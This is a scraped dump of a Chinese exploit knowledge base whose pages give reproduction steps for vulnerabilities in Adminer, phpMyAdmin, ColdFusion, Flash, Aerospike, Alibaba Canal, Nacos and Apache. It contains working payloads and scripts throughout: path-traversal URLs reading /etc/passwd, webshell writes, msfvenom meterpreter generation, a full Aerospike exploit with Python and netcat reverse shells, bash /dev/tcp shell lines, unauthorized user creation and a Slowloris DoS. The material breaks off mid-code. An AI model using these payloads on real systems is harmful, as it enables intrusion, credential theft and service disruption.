有一台靶机存在PHPmyadmin或者adminer(可以远程连接其他服务器) 攻击者在攻击机器上假装一个mysql服务器包含读取任意文件的poc 靶机上的任意文件被攻击机读取 这里用到的脚本是https://doanload.0-sec.org/Web安全/Adminer/Rogue-MySql-Server-master.zip 这里我们将端口改成了3308 读取目标机器上的test.php. 注意这里文件一定要按照他给的格式写，然后后面要有逗号，不然会读取失败. 然后在服务器上运行这个脚本，最坑的地方来了。。 这个脚本运行后会一直在后台运行，如果要读其他的文件需要把进程杀掉 netstat -tln | grep 3308 lsof -i:3308 kill 监听后会生成一个mysql.log文件 接着我们用phpmyadmin和adminer访问一下 登陆进去的状态，报错不用管 在log文件里可以读到test.php的文件内容 adminer也一样，不过adminer默认开启远程连接，所以挖src的时候碰到adminer就等于碰到金矿hh 明显发现adminer比phpmyadmin的数据量要少. 再有就是拿到shell后绕过open_basedir读取文件可以用这个漏洞. 参考链接 https://comicalt.github.io/contents/mysql-fileread/ https://www.anquanke.com/post/id/173039 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:25 "},"Web安全/Adminer/Adminers 1.1.3 （SQLite 3 写入一句话木马）/Adminers 1.1.3 （SQLite 3 写入一句话木马）.html":{"url":"Web安全/Adminer/Adminers 1.1.3 （SQLite 3 写入一句话木马）/Adminers 1.1.3 （SQLite 3 写入一句话木马）.html","title":"Adminers 1.1.3 （SQLite 3 写入一句话木马）","keywords":"","body":"Adminers 1.1.3 （SQLite 3 写入一句话木马） 一、漏洞简介 需要登陆Adminers，并且需要知道网站的路径。 二、漏洞影响 三、复现过程 ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/* ATTACH DATABASE '/网站/路径/shell.php' AS t;insert INTO t.e (d) VALUES ('');/* Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:24 "},"Web安全/Adobe ColdFusion/（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞/（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞.html":{"url":"Web安全/Adobe ColdFusion/（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞/（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞.html","title":"（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞","keywords":"","body":"（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞 一、漏洞简介 Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。 二、漏洞影响 Adobe ColdFusion 8 Adobe ColdFusion 9 三、复现过程 直接访问http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en，即可读取文件/etc/passwd： AdobeColdFusion文件读取漏洞/media/rId24.png) 读取后台管理员密码http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en： AdobeColdFusion文件读取漏洞/media/rId25.png) 参考链接 https://vulhub.org/\\#/environments/coldfusion/CVE-2010-2861/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:28 "},"Web安全/Adobe ColdFusion/（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞/（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞.html":{"url":"Web安全/Adobe ColdFusion/（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞/（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞.html","title":"（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞","keywords":"","body":"（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞 一、漏洞简介 二、漏洞影响 Adobe ColdFusion (2016 release) Update 3及之前的版本， ColdFusion 11 Update 11及之前的版本， ColdFusion 10 Update 22及之前的版本。 三、复现过程 使用ColdFusionPwn工具来生成POC。点击下载ColdFusionPwn Usage java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner [-s|-e] [payload type] '[command]' [outfile] 点击下载ysoserial【注意】下载的jar包可能因为时间不同，而更新，包名也就不同。注意将命令中的包名，替换为你下载时候的名字 java -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/CVE-2017-3066_is_success' poc.ser 生成poc.ser文件后，将POC作为数据包body发送给http://your-ip:8500/flex2gateway/amf，Content-Type为application/x-amf路径不唯一，目前已收集到的为以下两种路径：**/flex2gateway/amf**/messagebroker/amf POST /flex2gateway/amf HTTP/1.1 Host: your-ip:8500 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-amf Content-Length: 2853 [...poc...] AdobeColdFusion反序列化漏洞/media/rId28.png) 关于发送的内容编码问题 由于编码问题，如果直接从Notepad++/Notepad里面复制粘贴为body部分，是不成功的，即使返回的状态码是200 正确发送方式为： 右击选择Paste From File，上传poc.cer文件 AdobeColdFusion反序列化漏洞/media/rId31.png) 再到Raw界面添加HTTP头部，如果成功，并且打算以后还需要用的话，右击选择Copy to File保存 AdobeColdFusion反序列化漏洞/media/rId32.png) 进入容器中，发现/tmp/success已成功创建： AdobeColdFusion反序列化漏洞/media/rId33.png) 将POC改成反弹命令，成功拿到shell： AdobeColdFusion反序列化漏洞/media/rId35.png) 补充一下反弹shell的命令,可以通过http://www.jackson-t.ca/runtime-exec-payloads.html在线转换 bash -i >& /dev/tcp/ip/port 0>&1 参考链接 https://vulhub.org/\\#/environments/coldfusion/CVE-2017-3066/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:29 "},"Web安全/Adobe Flash Player/（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞/（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞.html":{"url":"Web安全/Adobe Flash Player/（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞/（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞.html","title":"（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞","keywords":"","body":"（CVE-2018-4878）Adobe Flash Player 远程代码执行漏洞 一、漏洞简介 2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。 二、漏洞影响 Adobe Flash Player \\ 三、复现过程 1.环境 kail: 192.168.184.128 win7sp1: 192.168.184.131 exp: CVE-2018-4878-master.zip flash: AdobeFlashPlayer28.0.0.161正式版.zip 2.利用msfvenom生成对应的shellcode代码 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.184.128 lport=4444 -f python>shellcode.txt AdobeFlashPlayer远程代码执行漏洞/media/rId24.png) 3.进入 CVE-2018-4878-master 目录，编辑CVE-2018-4878.py文件，将msfvenom生成的代码覆盖掉原来的代码 AdobeFlashPlayer远程代码执行漏洞/media/rId25.png) 4.修改 swf 文件及 html 文件位置 AdobeFlashPlayer远程代码执行漏洞/media/rId26.png) 5.Python 执行 CVE-2018-4878-master.py 代码，会生成两个文件，一个 swf 文件，一个 html 文件 AdobeFlashPlayer远程代码执行漏洞/media/rId27.png) 6.把生成的两个文件放到apache web目录下 AdobeFlashPlayer远程代码执行漏洞/media/rId28.png) 7.通过msf开启反弹sehll监听 AdobeFlashPlayer远程代码执行漏洞/media/rId29.png) 8.靶机上win7安装存在漏洞的adobe flash player 28.0.0.126 AdobeFlashPlayer远程代码执行漏洞/media/rId30.png) 9.通过win7自带的ie浏览器进行访问192.168.184.128/index2.html AdobeFlashPlayer远程代码执行漏洞/media/rId31.png) 10.Kail上成功获取到meterpreter shell AdobeFlashPlayer远程代码执行漏洞/media/rId32.png) AdobeFlashPlayer远程代码执行漏洞/media/rId33.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:31 "},"Web安全/Adobe Flash Player/Flash钓鱼源码/Flash钓鱼源码.html":{"url":"Web安全/Adobe Flash Player/Flash钓鱼源码/Flash钓鱼源码.html","title":"Flash钓鱼源码","keywords":"","body":"Flash 钓鱼源码 https://github.com/ianxtianxt/Flash-player Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:30 "},"Web安全/Aerospike/（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞/（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞.html":{"url":"Web安全/Aerospike/（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞/（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞.html","title":"（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞","keywords":"","body":"（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞 一、漏洞简介 攻击者借助特制的UDF利用该漏洞以当前用户权限在该集群的所有节点上执行任意的操作系统命令。 二、漏洞影响 Aerospike 社区版 \\ 三、复现过程 首先导入CVE-2020-13151.lua function runCMD(rec, cmd) local outtext = \"\" local phandle = io.popen(cmd) io.input(phandle) local foo = io.lines() for f in foo do outtext = outtext .. f .. \"\\n\" end return outtext end 3.png 创建单记录测试数据集以进行以下操作： 4.png 然后在最终在我们连接的主机上执行命令： 5.png poc CVE-2020-13151 1.png 2.png #!/usr/bin/env python3 import argparse import random import os, sys from time import sleep import string # requires aerospike package from pip import aerospike # if this isn't installing, make sure os dependencies are met # sudo apt-get install python-dev # sudo apt-get install libssl-dev # sudo apt-get install python-pip # sudo apt-get install zlib1g-dev PYTHONSHELL = \"\"\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'&\"\"\" NETCATSHELL = 'rm /tmp/ft;mkfifo /tmp/ft;cat /tmp/ft|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/ft&' def _get_client(cfg): try: return aerospike.client({ 'hosts': [(cfg.ahost, cfg.aport)], 'policies': {'timeout': 8000}}).connect() except Exception as e: print(f\"unable to access cluster @ {cfg.ahost}:{cfg.aport}\\n{e.msg}\") def _send(client, cfg, _cmd): try: print(client.apply((cfg.namespace, cfg.setname, cfg.dummystring ), 'poc', 'runCMD', [_cmd])) except Exception as e: print(f\"[-] UDF execution returned {e.msg}\") def _register_udf(client, cfg): try: client.udf_put(cfg.udfpath) except Exception as e: print(f\"[-] whoops, couldn't register the udf {cfg.udfpath}\") raise e def _random_string(l): return ''.join([random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(l)]) def _populate_table(client, cfg): ns = cfg.namespace setname = cfg.setname print(f\"[+] writing to {ns}.{setname}\") try: rec = cfg.dummystring client.put((ns, setname, rec), {'pk':cfg.dummystring}) print(f\"[+] wrote {rec}\") except Exception as e: print(f\"[-] unable to write record: {e.msg}\") try: if e.msg.startswith('Invalid namespace'): print(\"Valid namespaces: \") for n in _info_parse(\"namespaces\", client).split(\";\"): print(n.strip()) except: pass sys.exit(13) def _info_parse(k, client): try: return [i[1] for i in client.info_all(k).values() ][0] except Exception as e: print(f\"error retrieving information: {e.msg}\") return [] def _is_vuln(_mj, _mi, _pt, _bd): fixed = [5,1,0,3] found = [_mj, _mi, _pt, _bd] if fixed == found: return False for ix, val in enumerate(found): if val /root/.ssh/authorized_keys'\") sys.exit(0) parser = argparse.ArgumentParser(description='Aerospike UDF Command Execution - CVE-2020-13151 - POC') parser.add_argument(\"--ahost\", help=\"Aerospike host, default 127.0.0.1\", default=\"127.0.0.1\") parser.add_argument(\"--aport\", help=\"Aerospike port, default 3000\", default=3000, type=int) parser.add_argument(\"--namespace\", help=\"Namespace in which to create the record set\", default=\"test\") parser.add_argument(\"--setname\", help=\"Name of set to populate with dummy record(s), default is cve202013151\", default=None) parser.add_argument('--dummystring', help=\"leave blank for a random value, can use a previously written key to target a specific cluster node\", default=None) parser.add_argument(\"--pythonshell\", help=\"attempt to use a python reverse shell (requires lhost and lport)\", action=\"store_true\") parser.add_argument(\"--netcatshell\", help=\"attempt to use a netcat reverse shell (requires lhost and lport)\", action=\"store_true\") parser.add_argument(\"--lhost\", help=\"host to use for reverse shell callback\") parser.add_argument(\"--lport\", help=\"port to use for reverse shell callback\") parser.add_argument(\"--cmd\", help=\"custom command to issue against the underlying host\") parser.add_argument('--udfpath', help=\"where is the udf to distribute? defaults to `pwd`/poc.lua\", default=None) cfg = parser.parse_args() if not cfg.setname: cfg.setname = 'cve202013151' if not cfg.dummystring: cfg.dummystring = _random_string(16) if not cfg.udfpath: cfg.udfpath = os.path.join(os.getcwd(), 'poc.lua') assert cfg.cmd or (cfg.lhost and cfg.lport and (cfg.pythonshell or cfg.netcatshell)), \"Must specify a command, or a reverse shell + lhost + lport\" if cfg.pythonshell or cfg.netcatshell: assert cfg.lhost and cfg.lport, \"Must specify lhost and lport if using a reverse shell\" _exploit(cfg) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:33 "},"Web安全/Alibaba Canal/Alibaba Canal config 云密钥信息泄露漏洞/Alibaba Canal config 云密钥信息泄露漏洞.html":{"url":"Web安全/Alibaba Canal/Alibaba Canal config 云密钥信息泄露漏洞/Alibaba Canal config 云密钥信息泄露漏洞.html","title":"Alibaba Canal config 云密钥信息泄露漏洞","keywords":"","body":"Alibaba Canal config 云密钥信息泄露漏洞 漏洞描述 由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露 漏洞影响 [!NOTE] Alibaba Canal FOFA [!NOTE] title=\"Canal Admin\" 漏洞复现 验证漏洞的Url为 /api/v1/canal/config/1/0 其中泄露了 aliyun.access 密钥，可以控制密钥下的所有服务器 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:34 "},"Web安全/Alibaba Nacos/Alibaba Nacos权限认证绕过/Alibaba Nacos权限认证绕过.html":{"url":"Web安全/Alibaba Nacos/Alibaba Nacos权限认证绕过/Alibaba Nacos权限认证绕过.html","title":"Alibaba Nacos权限认证绕过","keywords":"","body":"Alibaba Nacos权限认证绕过 漏洞描述 2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞，攻击者可以通过该漏洞来创建新用户账户。 漏洞影响 Nacos 环境搭建 下载安装文件： https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 之后执行以下命令启动环境： ./startup.sh -m standalone 之后访问http://your-ip:8848/nacos，默认账号密码为：nacos/nacos 漏洞复现 Step 1:查看用户列表 http://192.168.174.236:8848/nacos/v1/auth/users?pageNo=1&pageSize=1 Step 2：添加用户Al1ex http://your-ip:8848/nacos/v1/auth/users POST:Nacos-Server....... username=Al1ex&password=Al1ex Step 3:登录测试 成功登录： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:35 "},"Web安全/Apache/（CVE-2007-6750）Apache ddos/（CVE-2007-6750）Apache ddos.html":{"url":"Web安全/Apache/（CVE-2007-6750）Apache ddos/（CVE-2007-6750）Apache ddos.html","title":"（CVE-2007-6750）Apache ddos","keywords":"","body":"（CVE-2007-6750）Apache ddos 一、漏洞简介 Apache HTTP服务器1.x和2.x允许远程攻击者通过部分HTTP请求导致拒绝服务(守护进程中断)，如Slowloris所示，这与2.2.15之前版本中缺少mod_ReqTimeout模块有关 二、漏洞影响 Apache 1.x/2.x 三、复现过程 nmap -sV -p80 192.168.146.175(用nmap查看Apache版本)(Apache2.2.3初步断定存在漏洞)Apacheddos/media/rId24.png) 接着访问网站查看是否正常(发现网站正常)Apacheddos/media/rId25.png) msfconsole(启动metasploit) use auxiliary/dos/http/slowloris(使用模块) set RHOST 192.168.146.175(设置目标IP) run(执行攻击) Apacheddos/media/rId26.png) 再访问网站查看是否正常(发现网站瘫痪) Apacheddos/media/rId27.png) 四、参考链接 https://www.jsxlo.com/cve-2007-6750/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:37 "},"Web安全/Apache/（CVE-2017-15715）Apache解析漏洞/（CVE-2017-15715）Apache解析漏洞.html":{"url":"Web安全/Apache/（CVE-2017-15715）Apache解析漏洞/（CVE-2017-15715）Apache解析漏洞.html","title":"（CVE-2017-15715）Apache解析漏洞","keywords":"","body":"（CVE-2017-15715）Apache解析漏洞 一、漏洞简介 二、漏洞影响 Apache 2.4.0到2.4.29 三、复现过程 首先正常上传一个图片，发现无法上传 Apache解析漏洞/media/rId24.png) 如果文件名取自$_FILES[\\'file\\'][\\'name\\']，就会自动把换行符去掉，而文件名取自post参数name中，就能很好的利用到这个解析漏洞 下面我们上传一个包含换行符的文件，这里需要注意只能时\\x0a而不是\\x0d\\x0a，\\x0d\\x0a的情况是我们直接添加一个换行符，我们利用burp的hex功能在test666.php后面添加一个\\x0a Apache解析漏洞/media/rId25.png) 从响应包中可以看到上传成功了，但是相应页面success.html中并没有告诉我们上传文件的目录 但是我们在请求包中还可以看到一个参数dir = /upload/，所以猜测上传目录为·/upload/test666.php%0a Apache解析漏洞/media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:38 "},"Web安全/Apache/（CVE-2019-0211）Apache HTTP 服务组件提权漏洞/（CVE-2019-0211）Apache HTTP 服务组件提权漏洞.html":{"url":"Web安全/Apache/（CVE-2019-0211）Apache HTTP 服务组件提权漏洞/（CVE-2019-0211）Apache HTTP 服务组件提权漏洞.html","title":"（CVE-2019-0211）Apache HTTP 服务组件提权漏洞","keywords":"","body":"（CVE-2019-0211）Apache HTTP 服务组件提权漏洞 一、漏洞简介 在Apache HTTP Server 2.4发行版2.4.17到2.4.38中，无论是使用Apache HTTP Server 的MPM event模式、还是worker或prefork模式，在低权限的子进程或线程中执行的代码(包括由进程内脚本解释器执行的脚本)可以通过操纵记分牌（scoreboard）来执行具有父进程(通常是Root进程)权限的任意代码。非unix系统则不受影响。 二、漏洞影响 Apache HTTP Server 2.4.17-2.4.38 三、复现过程 漏洞分析 1.恶意用户首先修改bucket,并使其指向恶意构造的prefork_child_bucket结构（共享内存中）。 2.优雅重启 主服务进程会杀死以前所有的工作进程，然后调用prefork_run，fork出新的工作进程 //省略无关的部分 static int prefork_run(apr_pool_t *_pconf, apr_pool_t *plog, server_rec *s) { int index; int remaining_children_to_start; int i; ap_log_pid(pconf, ap_pid_fname); if (!retained->mpm->was_graceful) {//跳过，因为优雅启动时，was_graceful为true if (ap_run_pre_mpm(s->process->pool, SB_SHARED) != OK) { retained->mpm->mpm_state = AP_MPMQ_STOPPING; return !OK; } /* fix the generation number in the global score; we just got a new, * cleared scoreboard */ ap_scoreboard_image->global->running_generation = retained->mpm->my_generation; } ... if (!retained->mpm->was_graceful) { startup_children(remaining_children_to_start); remaining_children_to_start = 0; } ... while (!retained->mpm->restart_pending && !retained->mpm->shutdown_pending) { ... ap_wait_or_timeout(&exitwhy, &status, &pid, pconf, ap_server_conf);//获取被杀死的工作进程的PID ... if (pid.pid != -1) { processed_status = ap_process_child_status(&pid, exitwhy, status); child_slot = ap_find_child_by_pid(&pid);//获取PID对应于计分板中对应parent的下标 ... /* non-fatal death... note that it's gone in the scoreboard. */ if (child_slot >= 0) { (void) ap_update_child_status_from_indexes(child_slot, 0, SERVER_DEAD, (request_rec *) NULL); prefork_note_child_killed(child_slot, 0, 0); if (processed_status == APEXIT_CHILDSICK) { /* child detected a resource shortage (E[NM]FILE, ENOBUFS, etc) * cut the fork rate to the minimum */ retained->idle_spawn_rate = 1; } else if (remaining_children_to_start && child_slot bucket);//则将死亡的工作进程的bucket作为参数传递（注意：bucket我们可以用“非常规手段”进行修改，从而提权） --remaining_children_to_start; } } } return OK; } make_child： static int make_child(server_rec *s, int slot, int bucket) { ... if (!pid) { my_bucket = &all_buckets[bucket];//使my_bucket指向共享内存中的到恶意构造的prefork_child_bucket结构 ... child_main(slot, bucket); ... return 0; } static void child_main(int child_num_arg, int child_bucket) { ... status = SAFE_ACCEPT(apr_proc_mutex_child_init(&my_bucket->mutex, apr_proc_mutex_lockfile(my_bucket->mutex), pchild));//如果Apache侦听两个或更多端口，则SAFE_ACCEPT（）将仅执行(这通常是因为服务器侦听HTTP（80）和HTTPS（443）) ... } APR_DECLARE(apr_status_t) apr_proc_mutex_child_init(apr_proc_mutex_t **mutex, const char *fname, apr_pool_t *pool) { return (*mutex)->meth->child_init(mutex, pool, fname); } 如果apr_proc_mutex_child_init执行，这导致（* mutex） - > meth-> child_init（mutex，pool，fname）被调用，从而执行恶意代码（注意，执行恶意代码的时候，进程仍然处于root权限，后面才降低自身的权限）。 通过gdb恶意修改bucket值造成的崩溃 (gdb) 716 child_main(slot, bucket); (gdb) s child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=80808080) at prefork.c:380 380 { (gdb) n .......... 432 status = SAFE_ACCEPT(apr_proc_mutex_child_init(&my_bucket->mutex, (gdb) s Program received signal SIGSEGV, Segmentation fault. 0x000000000046c16b in child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=80808080) at prefork.c:432 432 status = SAFE_ACCEPT(apr_proc_mutex_child_init(&my_bucket->mutex, 利用 利用分4个步骤 获得工作进程的R/W访问权限 在共享内存中写一个假的prefork_child_bucket结构 使all_buckets [bucket]指向该结构 等待早上6:25获得任意函数调用 问题：PHP不允许读写/proc/self/mem， 这会阻止我们利用简单方法编辑共享内存 获取工作进程内存的R/W访问权限 PHP UAF 0-day 由于mod_prefork经常与mod_php结合使用，因此通过PHP利用漏洞似乎很自然。我们使用PHP 7.x中的0day UAF（这似乎也适用于PHP5.x）来完成利用(也可以利用CVE-2019-6977) y; return $this; } } function get_aslr() { global $p, $y; $p = 0; $y = [new X('PT1S')]; json_encode([1234 => &$y]); print(\"ADDRESS: 0x\" . dechex($p) . \"\\n\"); return $p; } get_aslr(); 这是PHP对象上的UAF： 我们unset $y[0]（X的一个实例），但它仍然可以通过$this使用。 UAF导致读/写 我们希望实现两件事： 读取内存以查找all_buckets的地址 编辑共享内存，修改bucket，添加我们自定义的恶意结构 幸运的是，PHP的堆位于内存中的那两个之前。 PHP堆，ap_scoreboard_image，all_buckets的内存地址 root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p 7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so (gdb) p *ap_scoreboard_image $14 = { global = 0x7f4a9323e008, parent = 0x7f4a9323e020, servers = 0x55835eddea78 } (gdb) p all_buckets $15 = (prefork_child_bucket *) 0x7f4a9336b3f0 由于我们在PHP对象上触发UAF，因此该对象的任何属性也将是UAF; 我们可以将这个zend_object UAF转换为zend_string。因为zend_string的结构非常有用： (gdb) ptype zend_string type = struct _zend_string { zend_refcounted_h gc; zend_ulong h; size_t len; char val[1]; } len属性包含字符串的长度。 通过递增它，我们可以在内存中进一步读写，从而访问我们感兴趣的两个内存区域:共享内存和all_buckets。 定位bucket index 和 all_buckets 我们需要修改ap_scoreboard_image->parent[worker_id]->bucket中的parent结构中的bucket。幸运的是，parent结构总是处于共享内存块的开始，因此很容易找到： ➜ /www curl 127.0.0.1 PID: 14380 7f8a19da9000-7f8a19dc1000 rw-s 00000000 00:04 61736 /dev/zero (deleted) ➜ /www (gdb) p &ap_scoreboard_image->parent[0] $1 = (process_score *) 0x7f8a19da9040 (gdb) p &ap_scoreboard_image->parent[1] $2 = (process_score *) 0x7f8a19da9064 (gdb) 为了定位到all_buckets,我们可以利用我们对prefork_child_bucket结构的了解: prefork_child_bucket { ap_pod_t *pod; ap_listen_rec *listeners; apr_proc_mutex_t *mutex; all_buckets[0]->mutex 与 all_buckets[0] 位于同一个内存区域中（我的是第一个heap内存区域中）。apr_proc_mutex_unix_lock_methods_t是一个静态结构，位于libapr的.data，因此meth指针指向libapr中的data段中，且apr_proc_mutex_unix_lock_methods_t结构中的函数，位于libapr中的text段中。 由于我们可以通过/proc/self/maps来了解这些内存区域，我们可以遍历Apache内存中的每一个指针，找到一个匹配该结构的指针，这将是all_buckets [0]。 注意，all_buckets的地址在每次正常重启时都会发生变化。这意味着当我们的漏洞触发时，all_buckets的地址将与我们找到的地址不同。 必须考虑到这一点; 我们稍后会解决该问题。 向共享内存中写入恶意prefork_child_bucket结构 任意函数调用的代码路径如下 bucket_id = ap_scoreboard_image->parent[id]->bucket my_bucket = all_buckets[bucket_id] mutex = &my_bucket->mutex apr_proc_mutex_child_init(mutex) (*mutex)->meth->child_init(mutex, pool, fname) ApacheHTTP服务组件提权漏洞/media/rId32.png) 为了利用，我们使(mutex)->meth->child_init指向zend_object_std_dtor(zend_object object),这产生以下链: mutex = &my_bucket->mutex [object = mutex] zend_object_std_dtor(object) ht = object->properties zend_array_destroy(ht) zend_hash_destroy(ht) val = &ht->arData[0]->val ht->pDestructor(val) pDestructor 使其指向system函数，&ht->arData[0]->val为system函数的字符串。 ApacheHTTP服务组件提权漏洞/media/rId33.png) 如我们所见，两个最左边的两个结构是可以叠加的(prefork_child_bucket,zend_object结构)。 使all_buckets [bucket]指向恶意构造的结构 由于all_buckets地址在每次优雅重启之后会改变，我们需要对其进行改进，有两种改进：喷射共享内存和使用每个process_score结构。 喷射共享内存 如果all_buckets的新地址离旧地址不远，my_bucket将会大概指向我们的结构。因此，我们可以将其全部喷射在共享内存的未使用部分上，而不是将我们的prefork_child_bucket结构放在共享内存的精确位置。但是问题是，该结构也用于作为zend_object结构，因此它的大小为（5 * 8）40个字节以包含zend_object.properties字段。在共享内存中，喷射该混合结构，对我们没有帮助。 为了解决该问题，我们叠加apr_proc_mutex_t和zend_array结构，并将其地址喷洒在共享内存的其余部分。影响将是prefork_child_bucket.mutex和zend_object.properties指向同一地址。 现在，如果all_bucket重新定位没有远离其原始地址，my_bucket将位于喷射区域。 ApacheHTTP服务组件提权漏洞/media/rId36.png) 使用每个process_score结构 每个Apache工作进程都有一个关联的process_score结构，并且每一个都有一个bucket索引。我们可以改变它们中的每一个，而不是改变一个process_score.bucket值，以使它们覆盖内存的另一部分。 例如： ap_scoreboard_image->parent[0]->bucket = -10000 -> 0x7faabbcc00 parent[1]->bucket = -20000 -> 0x7faabbdd00 parent[2]->bucket = -30000 -> 0x7faabbff00 这样一来，我们的成功率就是原始成功率乘以Apache Worker的数量。 作者通过在共享内存中查找worker process的PID从而定位到每个process_score结构，并利用被UAF漏洞修改过的字符串结构对bucket字段值进行修改。 成功率 不同的Apache服务具有不同数量的工作进程。 拥有更多的工作进程意味着我们可以在更少的内存上喷射互斥锁的地址，但这也意味着我们可以为all_buckets指定更多的索引。 这意味着拥有更多工作进程可以提高我们的成功率。 在测试Apache服务器上尝试了4个工作进程（默认）后，成功率大约为80％。 随着更多工作进程，成功率跃升至100％左右。 同样，如果漏洞利用失败，它可以在第二天重新启动，因为Apache仍将正常重启。 然而，Apache的error.log将包含有关其工作进程段错误的通知。 利用PHP扩展模块体验任意函数执行 为了更好的理解该漏洞，我们用PHP扩展，来模拟PHP UAF，以达到任意地址读写。 环境 操作系统:CentOS 7 x64 Apache版本:Apache/2.4.38 (Unix) PHP版本:PHP 7.3.3 Apache 编译选项: ./configure --prefix=/usr/local/httpd/ --sysconfdir=/etc/httpd/ --with-include-apr --disable-userdir --enable-headers --with-mpm=prefork --enable-modules=most --enable-so --enable-deflate --enable-defate=shared --enable-expires-shared --enable-rewrite=shared --enable-static-support --with-apr=/usr/local/apr/ --with-apr-util=/usr/local/apr-util/bin --with-ssl --with-z PHP编译选项: ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/httpd/bin/apxs \\ --enable-fpm --with-zlib --with-libxml-dir --enable-sockets --with-curl --with-jpeg-dir --with-png-dir --with-gd --with-iconv-dir --with-freetype-dir --enable-gd-native-ttf --with-xmlrpc --with-openssl --with-mhash --with-mcrypt --with-pear --enable-mbstring --enable-sysvshm --enable-zip --disable-fileinfo PHP扩展 [root@bogon php-extension]# cat read_mem.c #include #include long read_mem(long addr) { return (unsigned long)(*((uint8_t*)(addr))); } [root@bogon php-extension]# cat write_mem.c #include #include void write_mem(long addr,long data) { *((uint8_t*)addr) = data; } [root@bogon php-extension]# 问题 我在Apache 2.4.38 与 Apache 2.4.25中，测试发现all_buckets的地址与共享内存的地址之间的差值，远远不是一个4字节能表示的（bucket索引4字节）。所以在我的演示中，需要通过gdb来修改 my_bucket = &all_buckets[bucket];//prefork.c:685 my_bucket的值，来模拟修改bucket，使其指向恶意的prefork_child_bucket结构。 PHP利用代码 >($j*8))); write_mem($addr+$j,$b); } } function write_mem_dword($addr,$data) { for($j=0;$j>($j*8))); write_mem($addr+$j,$b); } } function write_mem_byte($addr,$data) { write_mem($addr,$data); } /* get_mem_region: str为，maps文件中的特征字符串,用于搜索指定的内存区域 返回值为: array(2) { [0]=>//第一个匹配的内存区域 array(2) { [0]=> int(140231115968512)//起始地址 [1]=> int(140231116066816)//结束地址 [2]=> string(4) \"rw-s\"//保护权限 } [1]=>//第二个匹配的内存区域 array(2) { [0]=> int(140231116201984) [1]=> int(140231116718080) [2]=> string(4) \"rw-s\"//保护权限 } } */ function get_mem_region($str) { $file = fopen(\"/proc/self/maps\",\"r\"); $result_index = 0; $result = array(); while(!feof($file)){ $line = fgets($file); if(strpos($line,$str)){ $addr_len = 0; for(;$line[$addr_len]!='-';$addr_len++); $start_addr_str = substr($line,0,$addr_len); $end_addr_str = substr($line,$addr_len+1,$addr_len); $result[$result_index][0] = hexdec($start_addr_str); 